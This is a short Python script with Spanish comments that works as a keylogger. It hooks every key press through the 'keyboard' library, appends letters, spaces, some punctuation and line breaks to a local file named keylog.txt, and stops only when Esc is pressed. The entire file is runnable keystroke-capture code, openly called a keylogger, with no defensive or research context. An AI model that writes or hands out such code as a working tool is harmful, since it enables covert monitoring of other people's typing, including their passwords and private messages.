import keyboard  # Para capturar teclas
import os        # Para manejar archivos

# Archivo donde se guardan los logs
LOG_FILE = 'keylog.txt'

def on_key_press(event):
    key = event.name  # Obtiene el nombre de la tecla
    
    # Usa if/elif para diferentes tipos de teclas
    if key.isalpha():  # Si es una letra (a-z, A-Z)
        with open(LOG_FILE, 'a') as f:
            f.write(key)
    elif key == 'space':  # Espacio
        with open(LOG_FILE, 'a') as f:
            f.write(' ')
    elif key == ',':  # Coma
        with open(LOG_FILE, 'a') as f:
            f.write(',')
    elif key == '.':  # Punto
        with open(LOG_FILE, 'a') as f:
            f.write('.')
    elif key == '!':  # Exclamación
        with open(LOG_FILE, 'a') as f:
            f.write('!')
    elif key == '?':  # Interrogación
        with open(LOG_FILE, 'a') as f:
            f.write('?')
    elif key == 'enter':  # Enter (salto de línea)
        with open(LOG_FILE, 'a') as f:
            f.write('\n')
    # Agrega más elif aquí si quieres otros caracteres especiales
    
    # Para detener el programa (opcional, presiona 'esc')
    if key == 'esc':
        print("Deteniendo keylogger...")
        keyboard.unhook_all()  # Detiene el listener
        os._exit(0)  # Sale del programa

# Inicia el listener (corre indefinidamente hasta que lo detengas)
keyboard.on_press(on_key_press)
keyboard.wait()  # Mantiene el programa corriendo
